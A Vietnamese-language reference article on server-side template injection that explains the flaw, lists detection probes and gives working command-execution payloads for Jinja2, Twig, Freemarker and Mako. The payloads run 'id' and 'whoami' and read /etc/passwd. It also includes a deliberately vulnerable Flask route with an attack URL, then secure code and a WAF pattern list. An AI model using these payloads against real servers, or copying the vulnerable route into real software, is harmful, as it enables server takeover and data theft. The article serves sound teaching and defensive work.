# Server-Side Template Injection (SSTI)

> **CWE**: CWE-1336 | **Phân loại**: Injection

## Kiến thức Nền tảng

Để tạo ra các trang web động đẹp mắt một cách nhanh chóng, lập trình viên sử dụng các công cụ gọi là Template Engine (như Jinja2 trong Python, Twig trong PHP, hay Freemarker trong Java). Hãy tưởng tượng Template Engine giống như một khuôn mẫu thư gửi khách hàng có sẵn các ô trống dạng `{{ tên_khách_hàng }}`. Công cụ này sẽ tự động lấy tên thực tế để điền vào khuôn trước khi gửi đi. Khi hoạt động bình thường, dữ liệu của người dùng được truyền riêng biệt dưới dạng tham số nên cực kỳ an toàn, trình duyệt chỉ hiển thị nó dưới dạng văn bản thô.

```python
# Normal Jinja2 template rendering in Flask
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
    # Safe: user input is passed as DATA to the template
    template = "Hello, {{ username }}! Welcome to our site."
    return render_template_string(template, username=name)
    # Template engine escapes the value and renders it safely
```

Điểm quan trọng: khi user input được truyền dưới dạng **data** vào template, nó an toàn. Vấn đề phát sinh khi user input được **nhúng trực tiếp vào template string** trước khi render — lúc này input trở thành một phần của template code và được engine thực thi.

## Mô tả lỗ hổng

Lỗ hổng Server-Side Template Injection (SSTI) xảy ra khi lập trình viên ghép nối trực tiếp chuỗi thông tin của người dùng vào cấu trúc của khuôn mẫu trước khi mang đi xử lý, thay vì truyền nó dưới dạng dữ liệu riêng biệt. Việc này giống như cho phép người nhận thư tự viết thêm các hướng dẫn logic vào chính khuôn mẫu của bạn. Kẻ tấn công có thể chèn các cú pháp lập trình đặc biệt vào ô nhập liệu để bắt Template Engine thực thi. Vì các Template Engine này chạy trực tiếp trên máy chủ và có quyền truy cập vào các hàm lập trình cốt lõi bên dưới, kẻ tấn công có thể lợi dụng để đọc trộm các file bí mật, lấy cắp biến môi trường, hoặc thực thi lệnh hệ thống để chiếm quyền điều khiển hoàn toàn máy chủ (RCE).

## Cơ chế tấn công

### Bước 1: Phát hiện SSTI

```
# Polyglot detection payload - test across multiple engines
${{<%[%'"}}%\.

# Engine-specific probes
{{7*7}}         → 49   (Jinja2, Twig)
${7*7}          → 49   (Freemarker, Mako, EL)
#{7*7}          → 49   (Pebble, Thymeleaf)
<%= 7*7 %>      → 49   (ERB - Ruby)
{{7*'7'}}       → 7777777  (Jinja2 specifically, string repeat)
{{7*'7'}}       → 49       (Twig, does multiplication)
```

### Bước 2: RCE Payloads theo Engine

```python
# Jinja2 (Python) - Class traversal to reach os.popen()
# Step 1: Access the Method Resolution Order (MRO)
{{''.__class__.__mro__[1].__subclasses__()}}

# Step 2: Find subprocess.Popen (usually index ~400+)
{{''.__class__.__mro__[1].__subclasses__()[408]('id',shell=True,stdout=-1).communicate()}}

# Shorter Jinja2 RCE payload
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using request object in Flask
{{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}
```

```php
// Twig (PHP) - Using filter function
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

// Twig 3.x payload
{{['id']|map('system')}}
```

```java
// Freemarker (Java) - Built-in Execute
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

// Using ObjectConstructor
${"freemarker.template.utility.Execute"?new()("whoami")}
```

```python
# Mako (Python) - Direct Python code execution
<%import os%>${os.popen("id").read()}

# Alternative Mako payload
${__import__('os').popen('cat /etc/passwd').read()}
```

### Bước 3: Khai thác thực tế

```python
# Vulnerable Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/profile')
def profile():
    name = request.args.get('name', 'Guest')
    # VULNERABLE: User input concatenated into template string
    template = f"<h1>Welcome, {name}!</h1>"
    return render_template_string(template)

# Attack URL:
# /profile?name={{config.__class__.__init__.__globals__['os'].popen('cat+/etc/passwd').read()}}
```

## Biện pháp phòng thủ

- **Tóm tắt**: Truyền dữ liệu người dùng thông qua các biến ngữ cảnh (context variables) thay vì nhúng trực tiếp vào chuỗi template.
- **Các bước chi tiết**:
  - Không bao giờ nhúng user input vào template string: Truyền dữ liệu qua context variables.
  - Sandbox environment: Sử dụng Jinja2 `SandboxedEnvironment` để giới hạn class/method access.
  - Logic-less templates: Chọn template engine không cho phép thực thi code (Mustache, Handlebars).
  - WAF rules: Chặn các pattern như `{{`, `${`, `<%`, `__class__`, `__mro__`.
  - Tách biệt template từ user content: Nếu cần template tùy chỉnh, chạy trong container isolated.

## Code Example

```python
# ❌ VULNERABLE: User input embedded in template string
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input becomes part of the template CODE
    template = f"Hello {name}, welcome back!"
    return render_template_string(template)  # SSTI possible!
```

```python
# ✅ SECURE: User input passed as template data
from flask import Flask, request, render_template_string
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input is DATA, not part of the template code
    template = "Hello {{ name }}, welcome back!"
    return render_template_string(template, name=name)  # Safe rendering

@app.route('/custom-template')
def custom_template():
    user_template = request.args.get('tpl')
    # If user-provided templates are required, use sandboxed environment
    env = SandboxedEnvironment()
    try:
        tpl = env.from_string(user_template)
        return tpl.render(allowed_var="safe_value")
    except Exception:
        return "Invalid template", 400
```

## Xem thêm

- [Remote Code Execution](../../10-exceptional-conditions/remote-code-execution/) — Khái niệm thực thi mã từ xa trên máy chủ đích, vốn là hậu quả phổ biến nhất khi khai thác thành công lỗ hổng SSTI.

## Nguồn tham khảo

- PortSwigger: https://portswigger.net/web-security/server-side-template-injection
- HackTricks – SSTI: https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html
- CWE-1336: https://cwe.mitre.org/data/definitions/1336.html
- PayloadsAllTheThings – SSTI: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

## Giải thích thuật ngữ

- **SSTI (Server-Side Template Injection)**: Lỗ hổng tiêm cấu trúc mã của template engine vào ứng dụng để máy chủ biên dịch.
- **Template Engine**: Bộ công cụ giúp tách biệt phần giao diện HTML và logic xử lý dữ liệu của lập trình viên.
- **Render**: Quá trình đưa dữ liệu thực tế ghép vào khuôn mẫu để tạo nên trang web hoàn chỉnh.
- **Object Model**: Sơ đồ các đối tượng lập trình có thể truy cập được từ bên trong ngôn ngữ.
- **RCE**: Thực thi mã từ xa, cho phép chiếm quyền kiểm soát máy chủ.
